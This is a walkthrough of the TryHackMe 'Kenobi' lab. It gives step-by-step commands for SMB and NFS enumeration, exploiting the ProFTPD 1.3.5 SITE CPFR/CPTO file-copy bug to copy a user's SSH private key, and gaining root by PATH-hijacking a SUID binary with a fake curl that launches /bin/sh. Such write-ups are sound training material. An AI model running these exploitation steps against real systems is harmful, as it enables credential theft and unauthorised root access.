Kenobi — TryHackMe CTF 
Difficulty - Easy


Kenobi is a beginner-level machine on TryHackMe that targets SMB and FTP enumeration, a known ProFTPD exploit for initial foothold, and a SUID binary abuse for privilege escalation. The machine's IP address for this attempt was 10.10.101.175.

## Network Scanning

Reconnaissance always starts with an Nmap scan, so that's where this engagement began too — enabling version detection with -sV and Nmap's built-in scripting engine with -sC to get a fuller picture of what the host is running.

```bash
nmap -sV -sC 10.10.101.175
```

The results showed five open services worth investigating: FTP (21), SSH (22), HTTP (80), RPC (111 and 2049), and SMB (139 and 445). Given both RPC and SMB were present, the natural next move was to dig into the SMB shares, since open shares on these boxes often leak something useful.

## Enumeration

```bash
smbclient was the tool of choice here, run against the target's IP to list out whatever shares were available.
```

```bash
smbclient -L \\10.10.101.175
```

Along with the usual print$ and IPC$ shares, there was a share called "anonymous" — and true to its name, it didn't ask for valid credentials. Connecting to it was the obvious next step.

```bash
smbclient //10.10.101.175/anonymous
```



The share contained one file, log.txt, which was listed and downloaded for a closer look on the attacking machine.

```bash
ls
```

```bash
get log.txt
```

The contents of the log turned out to be a goldmine: it revealed the exact filesystem path of an id_rsa private key, and separately confirmed that the FTP daemon on the target was ProFTPD — a detail that would matter a lot in the next step.

```bash
cat log.txt
```



## Exploitation

Knowing where the id_rsa key lived and knowing ProFTPD was running opened up a clear path: find a way to abuse FTP to pull that key off the box. A quick Searchsploit lookup for the ProFTPD version turned up a File Copy vulnerability that fit the bill perfectly.

```bash
searchsploit ProFTPD 1.3.5
```

The exploit write-up was pulled down locally using Searchsploit's -m flag and read through to understand the mechanics.

```bash
searchsploit -m 36742
```

```bash
cat 36742.txt
```



In short, the vulnerability is exploitable through two raw FTP SITE commands — CPFR (Copy From) to set the source, and CPTO (Copy To) to set the destination — issued directly over a raw connection. Connecting with netcat, these two commands were used to copy the Kenobi user's private key out of their .ssh directory and into the world-accessible /var/tmp.

```bash
nc 10.10.101.175 21
```

```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
```

```bash
SITE CPTO /var/tmp/id_rsa
```



/var happens to be exported over NFS, which makes it mountable from outside — so rather than needing further FTP tricks, the key could simply be grabbed by mounting that share locally.

```bash
mkdir /mnt/ignite
```

```bash
mount 10.10.101.175:/var /mnt/ignite
```

```bash
cd /mnt/ignite/tmp
```

```bash
ls
```

Once mounted, the id_rsa file was sitting right there as expected. It was copied over and its permissions tightened to 600, which SSH requires before it will accept a private key file.

```bash
cp id_rsa /root/
```

```bash
cd /root
```

```bash
chmod 600 id_rsa
```

With a correctly-permissioned key in hand, authenticating over SSH as the kenobi user worked without issue, and the first flag was immediately readable.

```bash
ssh -i id_rsa kenobi@10.10.101.175
```

```bash
cat user.txt
```



## Privilege Escalation

Foothold secured, attention turned to getting root. The standard move here is hunting for SUID binaries, which often point directly at the intended escalation path on CTF-style machines.

```bash
find / -perm -u=s -type f 2>/dev/null
```

One entry immediately looked out of place: /usr/bin/menu, which isn't a stock Linux binary. Launching it brought up a small interactive menu offering a status check, a kernel-version lookup, and an ifconfig option.

```bash
/usr/bin/menu
```

Picking the kernel-version option returned 4.8.0-generic, formatted in a way that strongly suggested the binary wasn't computing this itself but shelling out to another program to get it. To confirm, strings was run against the binary to pull out any embedded, human-readable text.

```bash
strings /usr/bin/menu
```



Sure enough, the strings output showed a call to curl with no absolute path specified. That's a textbook PATH-hijacking opportunity: because the binary runs as root via SUID but resolves curl by searching PATH rather than calling it directly, placing a malicious file named curl earlier in the PATH causes the SUID binary to execute it instead of the real curl.

Acting on that, a fake curl was dropped into the writable /tmp directory — a one-line script that just hands over a shell — made executable, and /tmp was prepended to PATH so it would be resolved first.

```bash
cd /tmp
```

```bash
echo /bin/sh > curl
```

```bash
chmod 777 curl
```

```bash
export PATH=/tmp:$PATH
```

Running the menu binary once more and selecting the kernel-version option triggered the hijacked curl, dropping straight into a root shell. From there, the elevated privileges were confirmed and the final flag was captured.

```bash
/usr/bin/menu
```

```bash
id
```

```bash
cat /root/root.txt
```



## Conclusion

Kenobi chains together three fairly classic, low-difficulty vulnerabilities: a world-readable SMB share that leaked sensitive filesystem details, a documented ProFTPD file-copy bug that provided a path to credentials, and a PATH-hijackable SUID binary that handed over root. Nothing here required advanced exploit development, but the box is a solid exercise in methodical enumeration and recognizing well-known weaknesses when they show up in a real(ish) environment.


